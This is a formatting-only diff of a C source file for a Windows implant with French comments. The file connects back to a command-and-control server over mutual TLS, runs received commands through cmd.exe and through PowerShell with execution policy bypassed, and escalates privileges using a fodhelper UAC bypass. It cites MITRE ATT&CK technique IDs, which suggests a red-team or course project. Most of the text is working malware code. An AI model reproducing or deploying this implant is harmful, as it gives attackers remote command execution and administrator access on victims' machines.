@@ -47,14 +47,14 @@
  */
 
 #ifdef _WIN32
-#  include <windows.h>  /* Sleep, DWORD, GetModuleFileNameA, MAX_PATH */
+#include <windows.h> /* Sleep, DWORD, GetModuleFileNameA, MAX_PATH */
 #else
-#  include <unistd.h>   /* sleep (pour tests sur Linux) */
+#include <unistd.h> /* sleep (pour tests sur Linux) */
 #endif
 
-#include "tls.h"
-#include "privesc.h"
 #include "../payloads/shell.h"
+#include "privesc.h"
+#include "tls.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -69,15 +69,15 @@
  * Priorité : macro compilation (-DC2_IP=...) > .env > défaut.
  * En mode standalone, seules les macros comptent. */
 #ifndef C2_IP
-#  define C2_IP NULL
+#define C2_IP NULL
 #endif
 #ifndef C2_PORT
-#  define C2_PORT 0
+#define C2_PORT 0
 #endif
 
-#define BUFFER_SIZE 65536  /* taille max de la sortie d'une commande   */
-#define CMD_SIZE    1024   /* taille max d'une commande reçue du C2    */
-#define RETRY_DELAY 5      /* secondes entre les tentatives de reconnexion */
+#define BUFFER_SIZE 65536 /* taille max de la sortie d'une commande   */
+#define CMD_SIZE 1024     /* taille max d'une commande reçue du C2    */
+#define RETRY_DELAY 5     /* secondes entre les tentatives de reconnexion */
 
 /* ========================= Exécution de commandes ========================= */
 
@@ -91,8 +91,8 @@
  */
 static int run_pipe(const char *cmdline, char *buf, int buf_len) {
     FILE *fp;
-    int   total = 0;
-    int   n;
+    int total = 0;
+    int n;
 
 #ifdef _WIN32
     fp = _popen(cmdline, "r");
@@ -101,13 +101,17 @@ static int run_pipe(const char *cmdline, char *buf, int buf_len) {
 #endif
     if (!fp) {
         const char *err = "[implant] Impossible d'executer la commande\r\n";
-        int         el  = (int)strlen(err);
-        if (el < buf_len) { memcpy(buf, err, el); total = el; }
+        int el = (int)strlen(err);
+        if (el < buf_len) {
+            memcpy(buf, err, el);
+            total = el;
+        }
         return total;
     }
     while ((n = (int)fread(buf + total, 1, (size_t)(buf_len - 1 - total), fp)) > 0) {
         total += n;
-        if (total >= buf_len - 1) break;
+        if (total >= buf_len - 1)
+            break;
     }
 #ifdef _WIN32
     _pclose(fp);
@@ -119,9 +123,7 @@ static int run_pipe(const char *cmdline, char *buf, int buf_len) {
 }
 
 /* Exécute via cmd.exe — MITRE T1059.003 */
-static int exec_cmd(const char *cmd, char *buf, int buf_len) {
-    return run_pipe(cmd, buf, buf_len);
-}
+static int exec_cmd(const char *cmd, char *buf, int buf_len) { return run_pipe(cmd, buf, buf_len); }
 
 /* Exécute via PowerShell — MITRE T1059.001
  * Flags : -NoProfile (pas de profil utilisateur), -NonInteractive,
@@ -130,7 +132,8 @@ static int exec_ps(const char *cmd, char *buf, int buf_len) {
     char ps_cmd[CMD_SIZE + 128];
     snprintf(ps_cmd, sizeof(ps_cmd),
              "powershell.exe -NoProfile -NonInteractive "
-             "-ExecutionPolicy Bypass -Command \"%s\"", cmd);
+             "-ExecutionPolicy Bypass -Command \"%s\"",
+             cmd);
     return run_pipe(ps_cmd, buf, buf_len);
 }
 
@@ -152,7 +155,10 @@ int main(void) {
         DWORD len = GetModuleFileNameA(NULL, path, MAX_PATH);
         if (len > 0 && len < MAX_PATH) {
             char *sep = strrchr(path, '\\');
-            if (sep) { *sep = '\0'; SetCurrentDirectoryA(path); }
+            if (sep) {
+                *sep = '\0';
+                SetCurrentDirectoryA(path);
+            }
         }
     }
 #endif
@@ -167,8 +173,8 @@ int main(void) {
      *   1. Macro de compilation (-DC2_IP="...")  → valeur fixée dans le binaire
      *   2. .env (SERVER_IP=...)                  → fichier de config sur la cible
      *   3. Défaut (127.0.0.1:4444)               → loopback pour tests */
-    const char *ip   = cfg_get("SERVER_IP", C2_IP ? C2_IP : "127.0.0.1");
-    int         port = C2_PORT ? C2_PORT : cfg_port();
+    const char *ip = cfg_get("SERVER_IP", C2_IP ? C2_IP : "127.0.0.1");
+    int port = C2_PORT ? C2_PORT : cfg_port();
 
     /* Initialisation réseau (WSAStartup sur Windows) */
     if (tls_init() != 0)
@@ -182,10 +188,9 @@ int main(void) {
          * Mode standard : charge les certs depuis les fichiers (certs/).
          * Mode standalone : charge les certs depuis les tableaux en mémoire. */
 #ifdef EMBED_CERTS
-        tls_conn *c = tls_connect_embedded(ip, port,
-                          embed_ca_crt, embed_ca_crt_len,
-                          embed_client_crt, embed_client_crt_len,
-                          embed_client_key, embed_client_key_len);
+        tls_conn *c =
+            tls_connect_embedded(ip, port, embed_ca_crt, embed_ca_crt_len, embed_client_crt,
+                                 embed_client_crt_len, embed_client_key, embed_client_key_len);
 #else
         tls_conn *c = tls_connect(ip, port);
 #endif
@@ -205,7 +210,7 @@ int main(void) {
          * pour que le C2 sache où s'arrête la sortie. */
         char cmd[CMD_SIZE];
         char buf[BUFFER_SIZE];
-        int  n;
+        int n;
 
         while ((n = tls_recv(c, cmd, sizeof(cmd) - 1)) > 0) {
             cmd[n] = '\0';
@@ -241,11 +246,10 @@ int main(void) {
                 int out_len;
                 if (rc == 0)
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[elevate] success — %s launched as admin\r\n", self);
+                                       "[elevate] success — %s launched as admin\r\n", self);
                 else
-                    out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[elevate] error (code %d)\r\n", rc);
-                buf[out_len]     = '\x00';
+                    out_len = snprintf(buf, BUFFER_SIZE - 4, "[elevate] error (code %d)\r\n", rc);
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -266,21 +270,25 @@ int main(void) {
                 int out_len;
                 if (rc == 0)
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[privesc] success — %s launched as admin "
-                        "via fodhelper UAC bypass\r\n", exe);
+                                       "[privesc] success — %s launched as admin "
+                                       "via fodhelper UAC bypass\r\n",
+                                       exe);
                 else if (rc == -1)
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[privesc] error — registry write failed or "
-                        "exe not found: %s\r\n", exe);
+                                       "[privesc] error — registry write failed or "
+                                       "exe not found: %s\r\n",
+                                       exe);
                 else if (rc <= -1000)
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[privesc] error — ShellExecuteEx fodhelper "
-                        "failed (GetLastError=%d)\r\n", -(rc + 1000));
+                                       "[privesc] error — ShellExecuteEx fodhelper "
+                                       "failed (GetLastError=%d)\r\n",
+                                       -(rc + 1000));
                 else
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                        "[privesc] error — fodhelper launch failed "
-                        "(code %d)\r\n", rc);
-                buf[out_len]     = '\x00';
+                                       "[privesc] error — fodhelper launch failed "
+                                       "(code %d)\r\n",
+                                       rc);
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -291,7 +299,7 @@ int main(void) {
             /* ps <commande> — exécution PowerShell (T1059.001) */
             if (strncmp(cmd, "ps ", 3) == 0) {
                 int out_len = exec_ps(cmd + 3, buf, BUFFER_SIZE - 4);
-                buf[out_len]     = '\x00';
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -315,9 +323,9 @@ int main(void) {
                     free(out);
                 } else {
                     out_len = snprintf(buf, BUFFER_SIZE - 4,
-                            "[sh] unknown built-in command — try 'sh help'\r\n");
+                                       "[sh] unknown built-in command — try 'sh help'\r\n");
                 }
-                buf[out_len]     = '\x00';
+                buf[out_len] = '\x00';
                 buf[out_len + 1] = 'E';
                 buf[out_len + 2] = 'N';
                 buf[out_len + 3] = 'D';
@@ -331,7 +339,7 @@ int main(void) {
             /* Ajoute le marqueur "\x00END" (4 octets) en fin de payload.
              * Le C2 utilise ce marqueur pour détecter la fin de la réponse
              * et réafficher le prompt. */
-            buf[out_len]     = '\x00';
+            buf[out_len] = '\x00';
             buf[out_len + 1] = 'E';
             buf[out_len + 2] = 'N';
             buf[out_len + 3] = 'D';
